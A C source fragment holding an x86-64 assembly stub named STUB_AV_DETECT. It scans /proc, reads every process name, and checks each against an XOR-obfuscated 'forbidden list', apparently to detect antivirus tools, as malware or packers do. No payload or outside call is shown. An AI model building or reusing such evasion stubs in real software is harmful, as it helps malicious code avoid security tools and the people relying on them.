static const char STUB_AV_DETECT[] =
"_start:\n"
    //; [rsp+0..4095]    = buffer getdents64 (4096)
    //; [rsp+4096..4351] = process_name / comm (256)
    //; [rsp+4352..4415] = path_buffer (64)
"sub rsp, 4416\n"

    //; ── B1 : sys_open("/proc", O_DIRECTORY) ──
"mov rax, 2\n"
"lea rdi, [proc_path]\n"
"mov rsi, 0x10000\n"
"syscall\n"
//"break\n"              //; [B1] rax = proc_fd (>= 3) ou erreur (< 0)
"cmp rax, 0\n"
"jl exit_error\n"
"mov r12, rax\n"

"scan_loop:\n"
    //; ── B2 : sys_getdents64 ──
"mov rax, 78\n"
"mov rdi, r12\n"
"mov rsi, rsp\n"
"mov rdx, 4096\n"
"syscall\n"
//"break\n"              //; [B2] rax = nb octets lus ; rbx = fin ; rbp = debut
"cmp rax, 0\n"
"jle exit_clean\n"

"mov rbx, rsp\n"
"add rbx, rax\n"
"mov rbp, rsp\n"

"process_entry_loop:\n"
"cmp rbp, rbx\n"
"jge scan_loop\n"

    //; Filtre PID : d_name[0] dans ['0'..'9'] (ASCII 48..57) à [rbp+19]
"_ZERO eax\n"
"_SET al, [rbp+19]\n"
"cmp al, 48\n"
"jl next_entry\n"
"cmp al, 57\n"
"jg next_entry\n"
//"break\n"              //; [B3] entree PID retenue : al = premier chiffre, rbp = dirent

    //; Construire "/proc/<PID>/comm" dans [rsp+4352]
"lea rdi, [rsp]\n"
"add rdi, 4352\n"
"lea rsi, [proc_prefix]\n"
"copy_prefix:\n"
"_SET al, [rsi]\n"
"cmp al, 0\n"
"je copy_prefix_done\n"
"_STORE [rdi], al\n"
"_INC rsi\n"
"_INC rdi\n"
"jmp copy_prefix\n"
"copy_prefix_done:\n"
"lea rsi, [rbp+19]\n"
"copy_pid:\n"
"_SET al, [rsi]\n"
"cmp al, 0\n"
"je copy_pid_done\n"
"_STORE [rdi], al\n"
"_INC rsi\n"
"_INC rdi\n"
"jmp copy_pid\n"
"copy_pid_done:\n"
"lea rsi, [comm_suffix]\n"
"copy_suffix:\n"
"_SET al, [rsi]\n"
"_STORE [rdi], al\n"
"_INC rsi\n"
"_INC rdi\n"
"cmp al, 0\n"
"jne copy_suffix\n"
//"break\n"              //; [B4] chemin "/proc/<pid>/comm" construit a [rsp+4352]

    //; Ouvrir /proc/<pid>/comm
"mov rax, 2\n"
"lea rdi, [rsp]\n"
"add rdi, 4352\n"
"mov rsi, 0\n"
"syscall\n"
"cmp rax, 0\n"
"jl next_entry\n"
"mov r10, rax\n"

    //; Lire comm dans [rsp+4096]
"mov rax, 0\n"
"mov rdi, r10\n"
"lea rsi, [rsp]\n"
"add rsi, 4096\n"
"mov rdx, 255\n"
"syscall\n"
"push rax\n"

    //; Fermer /proc/<pid>/comm
"mov rax, 3\n"
"mov rdi, r10\n"
"syscall\n"

"pop rax\n"
//"break\n"              //; [B5] rax = nb octets lus dans comm ; [rsp+4096] = contenu
"cmp rax, 0\n"
"jle next_entry\n"

    //; Terminer par '\0' et retirer '\n' (10)
"lea rsi, [rsp]\n"
"add rsi, 4096\n"
"_ZERO rcx\n"
"_STORE [rsi + rax], cl\n"
"strip_newline:\n"
//"break\n"              //; [B6] rsi = debut du nom de processus lu
"_SET al, [rsi]\n"
"cmp al, 0\n"
"je strip_done\n"
"cmp al, 10\n"
"je found_newline\n"
"_INC rsi\n"
"jmp strip_newline\n"
"found_newline:\n"
"_ZERO eax\n"
"_STORE [rsi], al\n"
"strip_done:\n"
//"break\n"              //; [B7] rsi = debut du nom de processus lu, '\n' remplacé par '\0'

    //; Calculer la longueur de comm dans [rsp+4096] sans call/ret ni push/pop
"lea rsi, [rsp]\n"
"add rsi, 4096\n"
"_ZERO rdx\n"
"comm_len_loop:\n"
"_ZERO rax\n"
"_SET al, [rsi + rdx]\n"
"cmp al, 0\n"
"je comm_len_done\n"
"inc rdx\n"
"jmp comm_len_loop\n"
"comm_len_done:\n"

    //; Afficher comm (rdx = longueur, rsi = [rsp+4096])
"mov rax, 1\n"
"mov rdi, 1\n"
"syscall\n"

    //; Afficher '\n'
"mov rax, 1\n"
"mov rdi, 1\n"
"lea rsi, [newline]\n"
"mov rdx, 1\n"
"syscall\n"

    //; Comparer contre forbidden_list (XOR 42)
"lea rsi, [forbidden_list]\n"
"check_forbidden:\n"
"_ZERO eax\n"
"_SET al, [rsi]\n"
"cmp al, 0\n"
"je next_entry\n"
"lea rdi, [rsp]\n"
"add rdi, 4096\n"
//"break\n"              //; [B6] avant strcmp : rdi = comm, rsi = entree forbidden_list
"call strcmp\n"
"test rax, rax\n"
"jz found_forbidden\n"
"advance_forbidden:\n"
"_ZERO eax\n"
"_SET al, [rsi]\n"
"cmp al, 0\n"
"je check_forbidden\n"
"inc rsi\n"
"jmp advance_forbidden\n"

"next_entry:\n"
"_ZERO eax\n"
"_SET al, [rbp+17]\n"
"shl rax, 8\n"
"_ZERO rcx\n"
"_SET cl, [rbp+16]\n"
"or rax, rcx\n"
"add rbp, rax\n"
"jmp process_entry_loop\n"

"found_forbidden:\n"
//"break\n"//; [B7] processus interdit détecté : rsi = debut du nom de processus lu
"mov rdi, 1\n"
"lea rsi, [found_msg]\n"
"call strlen\n"
"mov rdx, rax\n"
"mov rax, 1\n"
"syscall\n"
"lea rsi, [rsp]\n"
"add rsi, 4096\n"
"call strlen\n"
"mov rdx, rax\n"
"mov rax, 1\n"
"mov rdi, 1\n"
"lea rsi, [rsp]\n"
"add rsi, 4096\n"
"syscall\n"
"mov rax, 1\n"
"mov rdi, 1\n"
"lea rsi, [newline]\n"
"mov rdx, 1\n"
"syscall\n"
"add rsp, 4416\n"
"mov rax, 60\n"
"mov rdi, 1\n"
"syscall\n"

"exit_clean:\n"
"mov rax, 3\n"
"mov rdi, r12\n"
"syscall\n"
"_SET eax, 1\n"
"_SET edi, 1\n"
"lea rsi, [msg_clear]\n"
"_SET edx, 6\n"
"syscall\n"
"add rsp, 4416\n"
"mov rax, 60\n"
"xor rdi, rdi\n"
"syscall\n"

"exit_error:\n"
"add rsp, 4416\n"
"mov rax, 60\n"
"mov rdi, 2\n"
"syscall\n"

"strcmp:\n"
"xor rcx, rcx\n"
"strcmp_loop:\n"
//"break\n" //; [B8] avant strcmp : rdi = comm, rsi = entree forbidden_list
"_SET al, [rdi+rcx]\n"
"_SET dl, [rsi+rcx]\n"
"xor dl, 42\n"
"cmp al, dl\n"
"jne strcmp_not_equal\n"
"test al, al\n"
"jz strcmp_equal\n"
"inc rcx\n"
"jmp strcmp_loop\n"
"strcmp_equal:\n"
"xor rax, rax\n"
"ret\n"
"strcmp_not_equal:\n"
"mov rax, 1\n"
"ret\n"

"strlen:\n"
"xor rax, rax\n"
"strlen_loop:\n"
"_ZERO edx\n"
"_SET dl, [rsi+rax]\n"
"cmp dl, 0\n"
"je strlen_done\n"
"inc rax\n"
"jmp strlen_loop\n"
"strlen_done:\n"
"ret\n";

